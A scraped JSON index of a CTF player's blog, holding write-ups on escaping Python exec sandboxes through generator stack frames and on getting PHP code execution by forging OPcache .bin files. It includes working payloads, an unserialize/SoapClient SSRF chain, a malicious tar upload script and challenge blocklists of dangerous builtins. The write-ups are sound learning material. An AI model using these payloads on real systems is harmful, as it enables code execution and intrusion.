[{"title":"python利用帧栈沙箱逃逸","path":"/2024/06/07/python帧栈沙箱逃逸/","content":"python利用帧栈沙箱逃逸基础知识生成器 在Python中，这种一边循环一边计算的机制，称为生成器：generator。 generator的函数，在每次调用next()的时候执行，遇到yield语句返回，再次执行时从上次返回的yield语句处继续执行。 举个简单栗子： 123456789def f(): a=1 while True: yield a a+=1f=f()print(next(f)) #1print(next(f)) #2print(next(f)) #3 如果我们给a定义一个范围，a&lt;&#x3D;100 ，可以使用for语句一次性输出 12345678def f(): a=1 for i in range(100): yield a a+=1f=f()for value in f: print(value) 生成器表达式generator和list做区别的是最外层的()，而list是[]。 1234x=(i * i for i in range(10))#next(x)for n in x: print(n) 上面一堆听不太懂也没多大关系，只需要知道一点generator获取yield定义的值通过next()函数 or for循环（for循环的原理是生成器是特殊的迭代器） 生成器属性 gi_code: 生成器对应的code对象。 gi_frame: 生成器对应的frame（栈帧）对象。 gi_running: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。 gi_yieldfrom：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。 gi_frame.f_locals：一个字典，包含生成器当前帧的本地变量。 着重看一下 gi_frame 属性 gi_frame 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。 比如： 123456789101112131415def my_generator(): yield 1 yield 2 yield 3gen = my_generator()# 获取生成器的当前帧信息frame = gen.gi_frame# 输出生成器的当前帧信息print(&quot;Local Variables:&quot;, frame.f_locals)print(&quot;Global Variables:&quot;, frame.f_globals)print(&quot;Code Object:&quot;, frame.f_code)print(&quot;Instruction Pointer:&quot;, frame.f_lasti) 帧栈(stack frame)栈帧包含了以下几个重要的属性： f_locals: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。 f_globals: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。 f_code: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。 f_lasti: 整数，表示最后执行的字节码指令的索引。 f_back: 指向上一级调用栈帧的引用，用于构建调用栈。 每个栈帧都会保存当时的 py 字节码和记录自身上一层的栈帧 ！！！！！ 利用帧栈沙箱逃逸原理就是通过生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表 栗子： 123456789101112131415161718s3cret=&quot;this is flag&quot;codes=&#x27;&#x27;&#x27;def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = next(g) #获取到生成器的栈帧对象 # frame = [x for x in g][0] # 由于生成器也是迭代器，所以也可以获取到生成器的帧栈 b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals return bb=waff()&#x27;&#x27;&#x27;locals=&#123;&#125;code = compile(codes, &quot;test&quot;, &quot;exec&quot;)exec(code,locals)print(locals[&quot;b&quot;]) 12345678910111213141516171819s3cret = &quot;this is flag&quot;codes = &#x27;&#x27;&#x27;def waff(): def f(): yield g.gi_frame.f_back g = f() # 生成器 # frame = next(g) # 获取到生成器的栈帧对象 frame = [x for x in g][0] # 由于生成器也是迭代器，所以也可以获取到生成器的帧栈 b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] # 返回并获取前一级栈帧的globals return bb = waff()&#x27;&#x27;&#x27;locals_dict = &#123;&#x27;s3cret&#x27;: s3cret&#125; # 这里稍微注意一下f_globals中没有找到s3cret变量code = compile(codes, &quot;test&quot;, &quot;exec&quot;)exec(code, locals_dict)print(locals_dict[&quot;b&quot;]) 代码说明： 之前提到的next获取yield定义的值，这里获取的就是g.gi_frame.f_back 使用g.gi_frame.f_back的话，那么g = f()就必须为g，用的就是这个生成器对象的栈帧 compile(codes, &quot;test&quot;, &quot;exec&quot;)就是设置了名称为test的python沙箱环境 理解一下逃逸的顺序： 1234567891011121314151617181920s3cret=&quot;this is flag&quot;codes=&#x27;&#x27;&#x27;def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = next(g) #获取到生成器的栈帧对象 print(frame) print(frame.f_back) print(frame.f_back.f_back)waff()&#x27;&#x27;&#x27;locals=&#123;&#125;code = compile(codes, &quot;test&quot;, &quot;exec&quot;)exec(code,locals) 即： 1f -&gt; waff -&gt; &lt;module&gt;(test) -&gt; &lt;module&gt;(ex1.py) 成功逃逸 获取到外部的栈帧，就可以用f_globals去获取沙箱外的全局变量了 但是yield g.gi_frame.f_back并不能修改为yield g.gi_frame 这样获取到的栈帧经过f_back后获得的是None 要是再来一个f_back就会报错 frame.f_back.f_back.f_back.f_back 尝试访问的是 waff 函数的外部调用者的栈帧对象，但是在这个例子中，waff 是最外层函数，没有外部函数调用它 再写一层就能理解了： 1234567891011121314151617181920212223242526s3cret=&quot;this is flag&quot;codes=&#x27;&#x27;&#x27;def xhw(): def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = next(g) #获取到生成器的栈帧对象 print(frame) print(frame.f_back) print(frame.f_back.f_back) print(frame.f_back.f_back.f_back) print(frame.f_back.f_back.f_back.f_back) waff()xhw()&#x27;&#x27;&#x27;locals=&#123;&#125;code = compile(codes, &quot;test&quot;, &quot;exec&quot;)exec(code,locals) globals中的__builtins字段__builtins__ 模块是 Python 解释器启动时自动加载的，其中包含了一系列内置函数、异常和其他内置对象。使用 dir(__builtins__) 来查看所有可用的内置函数和异常的列表 12&gt;&gt;&gt; dir(__builtins__)[&#x27;ArithmeticError&#x27;, &#x27;AssertionError&#x27;, &#x27;AttributeError&#x27;, &#x27;BaseException&#x27;, &#x27;BlockingIOError&#x27;, &#x27;BrokenPipeError&#x27;, &#x27;BufferError&#x27;, &#x27;BytesWarning&#x27;, &#x27;ChildProcessError&#x27;, &#x27;ConnectionAbortedError&#x27;, &#x27;ConnectionError&#x27;, &#x27;ConnectionRefusedError&#x27;, &#x27;ConnectionResetError&#x27;, &#x27;DeprecationWarning&#x27;, &#x27;EOFError&#x27;, &#x27;Ellipsis&#x27;, &#x27;EnvironmentError&#x27;, &#x27;Exception&#x27;, &#x27;False&#x27;, &#x27;FileExistsError&#x27;, &#x27;FileNotFoundError&#x27;, &#x27;FloatingPointError&#x27;, &#x27;FutureWarning&#x27;, &#x27;GeneratorExit&#x27;, &#x27;IOError&#x27;, &#x27;ImportError&#x27;, &#x27;ImportWarning&#x27;, &#x27;IndentationError&#x27;, &#x27;IndexError&#x27;, &#x27;InterruptedError&#x27;, &#x27;IsADirectoryError&#x27;, &#x27;KeyError&#x27;, &#x27;KeyboardInterrupt&#x27;, &#x27;LookupError&#x27;, &#x27;MemoryError&#x27;, &#x27;ModuleNotFoundError&#x27;, &#x27;NameError&#x27;, &#x27;None&#x27;, &#x27;NotADirectoryError&#x27;, &#x27;NotImplemented&#x27;, &#x27;NotImplementedError&#x27;, &#x27;OSError&#x27;, &#x27;OverflowError&#x27;, &#x27;PendingDeprecationWarning&#x27;, &#x27;PermissionError&#x27;, &#x27;ProcessLookupError&#x27;, &#x27;RecursionError&#x27;, &#x27;ReferenceError&#x27;, &#x27;ResourceWarning&#x27;, &#x27;RuntimeError&#x27;, &#x27;RuntimeWarning&#x27;, &#x27;StopAsyncIteration&#x27;, &#x27;StopIteration&#x27;, &#x27;SyntaxError&#x27;, &#x27;SyntaxWarning&#x27;, &#x27;SystemError&#x27;, &#x27;SystemExit&#x27;, &#x27;TabError&#x27;, &#x27;TimeoutError&#x27;, &#x27;True&#x27;, &#x27;TypeError&#x27;, &#x27;UnboundLocalError&#x27;, &#x27;UnicodeDecodeError&#x27;, &#x27;UnicodeEncodeError&#x27;, &#x27;UnicodeError&#x27;, &#x27;UnicodeTranslateError&#x27;, &#x27;UnicodeWarning&#x27;, &#x27;UserWarning&#x27;, &#x27;ValueError&#x27;, &#x27;Warning&#x27;, &#x27;WindowsError&#x27;, &#x27;ZeroDivisionError&#x27;, &#x27;__build_class__&#x27;, &#x27;__debug__&#x27;, &#x27;__doc__&#x27;, &#x27;__import__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;abs&#x27;, &#x27;all&#x27;, &#x27;any&#x27;, &#x27;ascii&#x27;, &#x27;bin&#x27;, &#x27;bool&#x27;, &#x27;breakpoint&#x27;, &#x27;bytearray&#x27;, &#x27;bytes&#x27;, &#x27;callable&#x27;, &#x27;chr&#x27;, &#x27;classmethod&#x27;, &#x27;compile&#x27;, &#x27;complex&#x27;, &#x27;copyright&#x27;, &#x27;credits&#x27;, &#x27;delattr&#x27;, &#x27;dict&#x27;, &#x27;dir&#x27;, &#x27;divmod&#x27;, &#x27;enumerate&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;exit&#x27;, &#x27;filter&#x27;, &#x27;float&#x27;, &#x27;format&#x27;, &#x27;frozenset&#x27;, &#x27;getattr&#x27;, &#x27;globals&#x27;, &#x27;hasattr&#x27;, &#x27;hash&#x27;, &#x27;help&#x27;, &#x27;hex&#x27;, &#x27;id&#x27;, &#x27;input&#x27;, &#x27;int&#x27;, &#x27;isinstance&#x27;, &#x27;issubclass&#x27;, &#x27;iter&#x27;, &#x27;len&#x27;, &#x27;license&#x27;, &#x27;list&#x27;, &#x27;locals&#x27;, &#x27;map&#x27;, &#x27;max&#x27;, &#x27;memoryview&#x27;, &#x27;min&#x27;, &#x27;next&#x27;, &#x27;object&#x27;, &#x27;oct&#x27;, &#x27;open&#x27;, &#x27;ord&#x27;, &#x27;pow&#x27;, &#x27;print&#x27;, &#x27;property&#x27;, &#x27;quit&#x27;, &#x27;range&#x27;, &#x27;repr&#x27;, &#x27;reversed&#x27;, &#x27;round&#x27;, &#x27;set&#x27;, &#x27;setattr&#x27;, &#x27;slice&#x27;, &#x27;sorted&#x27;, &#x27;staticmethod&#x27;, &#x27;str&#x27;, &#x27;sum&#x27;, &#x27;super&#x27;, &#x27;tuple&#x27;, &#x27;type&#x27;, &#x27;vars&#x27;, &#x27;zip&#x27;] L3HCTF2024源码 1234567891011121314151617181920212223242526272829303132333435363738import sysimport oscodes=&#x27;&#x27;&#x27;&lt;&lt;codehere&gt;&gt;&#x27;&#x27;&#x27;try: codes.encode(&quot;ascii&quot;)except UnicodeEncodeError: exit(0)if &quot;__&quot; in codes: exit(0)codes+=&quot; res=factorization(c)&quot;locals=&#123;&quot;c&quot;:&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;,&quot;__builtins__&quot;: None&#125;res=set()def blackFunc(oldexit): def func(event, args): blackList = [&quot;process&quot;,&quot;os&quot;,&quot;sys&quot;,&quot;interpreter&quot;,&quot;cpython&quot;,&quot;open&quot;,&quot;compile&quot;,&quot;__new__&quot;,&quot;gc&quot;] for i in blackList: if i in (event + &quot;&quot;.join(str(s) for s in args)).lower(): print(i) oldexit(0) return funccode = compile(codes, &quot;&lt;judgecode&gt;&quot;, &quot;exec&quot;)sys.addaudithook(blackFunc(os._exit))exec(code,&#123;&quot;__builtins__&quot;: None&#125;,locals)p=int(locals[&quot;res&quot;][0])q=int(locals[&quot;res&quot;][1])if(p&gt;1e5 and q&gt;1e5 and p*q==int(&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;)): print(&quot;Correct!&quot;,end=&quot;&quot;)else: print(&quot;Wrong!&quot;,end=&quot;&quot;) 上述代码大概就是通过exec执行任意代码，返回的p和q需要满足if语句 过滤了__，还有过滤一些其他，这导致不能使用gc去获取对象引用（下面的据说可以用gc秒） 1234if &quot;__&quot; in codes: exit(0) blackList = [&quot;process&quot;,&quot;os&quot;,&quot;sys&quot;,&quot;interpreter&quot;,&quot;cpython&quot;,&quot;open&quot;,&quot;compile&quot;,&quot;__new__&quot;,&quot;gc&quot;] 最关键的是 &#123;&quot;__builtins__&quot;: None&#125; 置空了__builtins__ 1exec(code,&#123;&quot;__builtins__&quot;: None&#125;,locals) 根据上述条件，这道题的解题思路就是通过栈帧对象逃逸出沙箱从而获取到沙箱外的globals 123a=(a.gi_frame.f_back.f_back for i in [1])a=[x for x in a][0]globals=a.f_back.f_back.f_globals 123456a=(a.gi_frame.f_back.f_back for i in [1])a=[x for x in a][0]STYLUSa=(a.gi_frame.f_back.f_back for i in [1])a=[x for x in a][0]globals=a.f_back.f_back.f_globals #自行控制f_back，逃逸到外部文件即可，如果是flask，不要逃逸过头了到源文件去了STYLUS 然后将沙箱外部的int函数修改为fakeint函数即可 123456def fake_int(i): return 100001 * 100002a=(a.gi_frame.f_back.f_back for i in [1])a=[x for x in a][0]builtin =a.f_back.f_back.f_globals[&quot;_&quot;*2+&quot;builtins&quot;+&quot;_&quot;*2]builtin.int=fake_int 第九届中国海洋大学信息安全竞赛源码 12345678910111213141516171819202122232425262728293031323334353637383940414243from flask import *import ioimport timeapp = Flask(__name__)black_list = [ &#x27;__build_class__&#x27;, &#x27;__debug__&#x27;, &#x27;__doc__&#x27;, &#x27;__import__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;SystemExit&#x27;, &#x27;breakpoint&#x27;, &#x27;compile&#x27;, &#x27;exit&#x27;, &#x27;memoryview&#x27;, &#x27;open&#x27;, &#x27;quit&#x27;, &#x27;input&#x27;]new_builtins = dict([ (key, val) for key, val in __builtins__.__dict__.items() if key not in black_list])flag = &quot;flag&#123;xxxxxxxxx&#125;&quot;flag = &quot;DISPOSED&quot;@app.route(&quot;/&quot;)def index(): return redirect(&quot;/static/index.html&quot;)@app.post(&quot;/run&quot;)def run(): out = io.StringIO() script = str(request.form[&quot;script&quot;]) def wrap_print(*args, **kwargs): kwargs[&quot;file&quot;] = out print(*args, **kwargs) new_builtins[&quot;print&quot;] = wrap_print try: exec(script, &#123;&quot;__builtins__&quot;: new_builtins&#125;) except Exception as e: wrap_print(e) ret = out.getvalue() out.close() return rettime.sleep(5) # current source file is deletedapp.run(&#x27;0.0.0.0&#x27;, port=9001) flag在源码中，但是源码被删除，没有 /proc目录 要获得被覆写的 flag 内容只剩一个地方可以找，就是依靠 python 解析自身进程的内存 cpython 的实现中暴露了获取 python 栈帧的方法 而每个栈帧都会保存当时的 py 字节码和记录自身上一层的栈帧 而对 flag 的赋值的字节码肯定存在于某个栈帧中，我们只需要从当前栈帧向上找就行了 法一利用 ctypes模块的指针，将flag地址周围的值读一下，实现一个从内存读源码 因为真正的flag在覆盖的flag之前，所以读到假的flag的地址后，往前读取即可 这里用了char 指针，读出来的是一个字符串 最细节的是每次位移8的倍数。（可以自行对比任意两个变量的地址，可以发现它们的差值都是8的倍数） 123456789101112a=(a.gi_frame.f_back.f_back for i in [1])a = [x for x in a][0]b = a.f_back.f_globalsflag_id = id(b[&#x27;flag&#x27;]) #id()函数用于读取内存地址ctypes = b[&quot;__builtins__&quot;].__import__(&#x27;ctypes&#x27;)#print(ctypes)for i in range(10000):\ttxt = ctypes.cast((flag_id-8*i),ctypes.c_char_p).value\tif b&quot;flag&quot; in txt: print(txt)STYLUS 官方wp使用的是非常普通的继承链获取globals对象，然后从线程上去找栈帧 而且flask 使用了多线程去处理每个请求，这导致直接在当前线程的栈帧向上找会找不到主线程的 flag，需要从主线程栈帧向上找 123456789101112131415161718192021sys = print.__globals__[&quot;__builtins__&quot;].__import__(&#x27;sys&#x27;)io = print.__globals__[&quot;__builtins__&quot;].__import__(&#x27;io&#x27;)dis = print.__globals__[&quot;__builtins__&quot;].__import__(&#x27;dis&#x27;)threading = print.__globals__[&quot;__builtins__&quot;].__import__(&#x27;threading&#x27;)print(threading.enumerate()) #获取所有活跃线程print(threading.main_thread()) #获取主线程print(threading.main_thread().ident) # 获取主线程标识符print(sys._current_frames()) # 获取所有线程的堆栈帧对象print(sys._current_frames()[threading.main_thread().ident]) #获取到主线程的堆栈帧对象frame = sys._current_frames()[threading.main_thread().ident]while frame is not None:\tout = io.StringIO() # 内存创建字符串I/O流\tdis.dis(frame.f_code,file=out) # 将当前堆栈帧所对应的函数的字节码进行反汇编\tcontent = out.getvalue() #获取反汇编的结果\tout.close()\tprint(content)\tframe = frame.f_backPYTHON gcL3HCTF那题禁用了gc，但是这题没有，有师傅用这个秒了好像 123print([].__class__.__base__.__subclasses__()[84].load_module(&#x27;gc&#x27;).get_objects())#&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;STYLUS 东西太多了，有点卡 题外话： 这回国赛遇到了我竟然没做？？？！！！，没做？？？（我真该死） 参考： python利用栈帧进行沙箱逃逸 Python利用栈帧沙箱逃逸 生成器 L3HCTF-intractable problem"},{"title":"PHP7/8 OPCACHE缓存文件导致的RCE","path":"/2024/06/07/Opcache-PHP/","content":"PHP7&#x2F;8 OPCACHE缓存文件导致的RCEOPcache基础 OPcache（Opcode Cache）是 PHP 的一个内置的加速模块，通过解析的 PHP 脚本预编译存放在共享内存中的字节码来避免每次加载和解析 PHP 脚本的开销，解析器可以直接从共享内存读取已经缓存过的字节码，从而大大提高了 PHP 的执行效率。 PHP的正常执行流程： request请求(nginx,apache,cli等) Zend引擎读取.php文件 扫描其字典和表达式 解析文件 创建要执行的计算机代码(成为Opcode) 最后执行Opcode response返回 每一次执行 PHP 都要执行一遍上面的步骤，如果 PHP 源码没有变化，那么 OPcode 也不会变化，显然没有必要，下面是使用 OPcache 之后 避免重组编译 减少CPU和内存开销 配置解读 1234567891011file_cache_only = 0//PHP7 的默认值为 0，表示内存缓存方式的优先级高于文件缓存，那么重写后的 OPcache 文件(webshell)是不会被执行的。但是，当 Web 服务器重启后，就可以绕过此限制。因为，服务器重启之后，内存的缓存为空，此时，OPcache 会使用文件缓存的数据填充内存缓存的数据，这样，webshell 就可以执行了。opcache.validate_timestamps=0//PHP7 的默认值为 1，表示启用了时间戳校验，OPcache 会将被请求访问的 PHP 源文件的时间戳与对应的缓存文件的时间戳进行校验。如果两个时间戳不匹配，缓存文件将被丢弃，并且重新生成一份新的缓存文件。想要绕过此限制，攻击者必须知道目标源文件的时间戳，因此可以先获取到 bin 文件，拿到时间戳，然后将我们的恶意 bin 文件的时间戳替换即可opcache.file_cache=/tmp//开启Opcache File Cache(实验性), 通过开启这个, 我们可以让Opcache把opcode缓存缓存到外部文件中, 对于一些脚本, 会有很明显的性能提升.这样PHP就会在 /tmp 目录下 Cache 一些 Opcode 的二进制导出文件, 可以跨 PHP 生命周期存在. 环境搭建123456789101112131415161718192021222324252627docker pull php:7.1-apache//docker pull php:8.2-apachedocker run -d -p 9000:80 --name opcache7 php:7.1-apache//docker run -d -p 9001:80 --name opcache8 php:8.2-apacheapt-get updateapt install vimvim phpinfo.php //写phpinfo//安装opcache插件docker-php-ext-configure opcache --enable-opcache &amp;&amp; docker-php-ext-install opcachevim /usr/local/etc/php/php.ini-production//找到opcache部分添加下面三行句子(如果我没记错的话在 1798 行/8是1784):cry:[opcache]opcache.enable=1opcache.file_cache=&quot;/tmp&quot;opcache.file_cache_only=1//docker的php是没有php.ini配置文件的，修改了php.ini-production后复制并重命名为php.ini即可cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini//修改了php.ini要重启服务service apache2 reload 看到这一行就说明配置成功了 再看一下 docker 中的文件 当Opcache第一次缓存文件时， /tmp/system_id/var/www/html/phpinfo.php.bin OPcache-PHP7Opcache rce的原理 Opache 是 php 中一个生成缓存文件的拓展，当我们访问一个 php 文件时，他会产生一个缓存文件，下次访问该 php 文件时，就是直接根据缓存文件回显页面了。 所以，我们需要做的就是伪造文件替换即可 缓存文件夹为1116d566fdc53f79abce6c01e3a0308d计算&#96;&#96;system_id&#96;是今天的重点 可以根据phpinfo的信息计算出来system_id的 在 PHP 环境下已经有前人给出我们计算脚本，https://github.com/GoSecure/php7-opcache-override 接下来，当我们存在任意文件写入或者覆盖时，我们可以通过覆盖.php.bin文件达到RCE的目的 把文件搞下来，分析一下 ​\t可以看到最开头是OPACHE+systemid，因此假如我们获取到了SYSTEMID，我们就可以伪造一份缓存文件了，但是还需要注意一点 我们这里的opache拓展开启了timestamp，也就是时间戳验证，那么假如我们创建的文件时间戳不对的话，我们也无法覆盖成功的，那么就需要题目有一个获取时间的地方，假如可以下载任意文件或者直接获取时间戳，那么我们可以用010editor直接修改。 图中蓝色代表的就是时间戳了。我们记住这个时间戳，然后我们同样去自己的服务器生成一个一句话木马的缓存bin文件： 然后替换掉这个文件。然后访问 phpinfo.php 看看效果： 这样就成功getshell了，需要注意一下生成恶意bin文件的php版本需要大致吻合，不能差太多。 Opcache-PHP8在PHP8之后，opcache生成system_id的方法有些许改变，所以之前的脚本是跑不出来了 可以看出来这里的 system_id 不同 这里的规律佬说动调可以看出来是php 版本号 + API 12&lt;?phpvar_dump(md5(&quot;8.2.15API420220829,NTSBIN_4888(size_t)8\\002&quot;)); 最后算出来的一样 接下来的跟 PHP7 没区别了就 DASCTF X 0psu3 十一月挑战赛 single_php通过 highlight_file 高亮代码获得如下 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; img &#123; max-width: 200px; max-height: 200px; &#125; &lt;/style&gt; &lt;title&gt;revenge to siranai.php &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h5&gt; This is my wife.She is from Imagination. And I,use her name as my id. &lt;/h5&gt; &lt;img src=&quot;mywife.png&quot; alt=&quot;this is my wife&quot;&gt; &lt;p&gt;I have been single dog for 19 years.&lt;br&gt; One day, my brothers betrayed the singles organization.&lt;br&gt; S* and B* ,both of them have the kanozyo.&lt;br&gt; Now revenge to them!!!!!&lt;br&gt; use &#x27;$_GET[&#x27;LuckyE&#x27;](__FILE__);&#x27; to begin your revenge!!&lt;br&gt; &lt;/p&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php error_reporting(0); class siroha&#123; public $koi; public function __destruct()&#123; $this-&gt;koi[&#x27;zhanjiangdiyishenqing&#x27;](); &#125; &#125; $kanozyo = $_GET[&#x27;LuckyE&#x27;](__FILE__); var_dump($kanozyo); $suki = unserialize($_POST[&#x27;suki&#x27;]); siranai.php 存在反序列化，但是只能执行一个无参的函数，例如phpinfo() 1234567&lt;?phpclass siroha&#123; public $koi = array(&quot;zhanjiangdiyishenqing&quot;=&gt;&quot;phpinfo&quot;);&#125;$a = new siroha();echo serialize($a); 反序列化调用查看 phpinfo 相关信息 首先 OPcache 开启并且缓存文件在 &#x2F;tmp 目录下 然后需要注意的是时间戳是开启的，所以要办法读时间戳 filemtime—— 取得文件修改时间 获取时间戳(官方wp是脚本读的) 接着分析一下 siranai.php 的代码 1234567891011121314&lt;?phperror_reporting(0);highlight_file(__FILE__);$allowed_ip = &quot;127.0.0.1&quot;;if ($_SERVER[&#x27;REMOTE_ADDR&#x27;] !== $allowed_ip) &#123; die(&quot;S* has the kanojo but you don&#x27;t&quot;);&#125; $finfo = finfo_open(FILEINFO_MIME_TYPE); if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/x-tar&#x27;)&#123; exec(&#x27;cd /tmp &amp;&amp; tar -xvf &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); &#125; 发现上传的文件会在/tmp目录下解压，但是限制了访问ip为127.0.0.1，需要SSRF 那么思路就很清晰了，通过反序列化的可变函数调用到__call()方法，触发SoapClient类的SSRF上传压缩包，解压到/tmp/[system_id]/var/www/html/index.php.bin实现RCE 1. 构造恶意的index.phpbin 文件修改system_id + 时间戳 2. 创建tar压缩包 + 反序列化实现POST请求这里通过python请求获取到压缩包上传的报文 直接贴上官方WP里的python脚本 12345678910111213141516171819202122232425import hashlibimport tarfileimport requestssys_id = hashlib.md5(&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\\002&quot;.encode(&quot;utf-8&quot;)).hexdigest()def tar_file(): tar_filename = &#x27;exp.tar&#x27; with tarfile.open(tar_filename,&#x27;w&#x27;) as tar: directory_info = tarfile.TarInfo(name=f&#x27;&#123;sys_id&#125;/var/www/html&#x27;) directory_info.type = tarfile.DIRTYPE directory_info.mode = 0o777 tar.addfile(directory_info) tar.add(&#x27;index.php.bin&#x27;, arcname=f&#x27;&#123;sys_id&#125;/var/www/html/index.php.bin&#x27;)def upload(): file = &#123;&quot;file&quot;:(&quot;exp.tar&quot;,open(&quot;exp.tar&quot;,&quot;rb&quot;).read(),&quot;application/x-tar&quot;)&#125; res = requests.post(url=&quot;http://78bc1e89-1ea7-4655-8f23-5c452dc6ae17.node5.buuoj.cn:81/&quot;,files=file) print(res.request.headers) return res.requesttar_file()request_content = upload()upload_body = str(request_content.body).replace(&quot;\\&quot;&quot;,&quot;\\\\\\&quot;&quot;)print(upload_body) 将生成的请求体数据封装在 SoapClient 内置类里，序列化 12345678910&lt;?phpclass siroha&#123; public $koi;&#125;$postdata = &quot;&quot;;$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &quot;http://127.0.0.1/siranai.php&quot;, &#x27;user_agent&#x27; =&gt; &quot;aaa\\r &quot; . &quot;Cookie: PHPSESSION=aaa\\r Content-Type: multipart/form-data; boundary=&quot;.substr($postdata,2,32).&quot;\\r Connection: keep-alive\\r Accept: */*\\r Content-Length: 10416&quot;.&quot;\\r \\r &quot;.$postdata,&#x27;uri&#x27; =&gt; &quot;aaa&quot;));$b = new siroha();$b-&gt;koi=[&quot;zhanjiangdiyishenqing&quot;=&gt;[$a,&quot;nnnnn&quot;]];echo urlencode(serialize($b)); 最后suki反序列化即可，注意这里同时需要GET传参，满足var_dump($kanozyo);不报错 这里调用 SoapClient 对象的不存在的nnnnn方法，会触发call方法。burp发包 成功 getshell 参考： [PHP8 OPCACHE缓存文件导致RCE - Boogiepop Doesn’t Laugh (boogipop.com)](https://boogipop.com/2023/06/16/PHP8 OPCACHE缓存文件导致RCE&#x2F;) php Opcache插件进行RCE - Zer0peach can’t think Nepnep战队分享会-20:08 CTF： 春秋杯2023-php_again ASIS CTF 2016 - BinaryCloud - Web Challenge – ctf.rip ctfs&#x2F;alictf-2016&#x2F;homework at master · tothi&#x2F;ctfs · GitHub"},{"path":"/about/index.html","content":"Hi,this is Mi4t一些非常通透的自我认知标签： 懒癌晚期非常非常晚期（没救了） 一个非常非常菜的web手（承蒙队友不嫌弃，次次带我飞） ctfer（这辈子算是毁在CTF身上了，我还没复习期末:cry:） src萌新，萌的不能再萌（挖洞到底是什么感觉.jpg） 在学长学姐的带领下对网络安全产生了浓厚的兴趣（殊不知一入网安深似海bushi），搭建博客的目的也是催促自己去学习思考（无奈实在太懒了，搭了这么久），祝愿自己不会断更 作为一个ctfer（自封的），怎么能没有自己的flag呢！ O1 2024年的大大目标：努力向大佬看齐 来自2025年的祝愿：希望能基本实现目标 正常 21% KR1 - 第一步先看完那三本书（顺带着操作） 能给我实践的机会吗？ 正常 10% KR2 稳固外网漏洞 top10的复习 亦或者能给一个挖SRC的机会吗 正常 10% KR3 尝试去开发一些东西？？？ 比如说先给大创整了 正常 12% KR4 Others？？ 天天开心最重要 正常 50%"},{"title":"daily","path":"/daily/index.html","content":"后续会在这里搞一些日常（其实也就是牢骚），发现memos要搭在公网上（并不想），让我先研究研究（实在不行整个静态的），希望不会鸽太久，太忙了。。"},{"title":"fridens","path":"/friends/index.html","content":"inf_Popayw🍭bananaships🍌"}]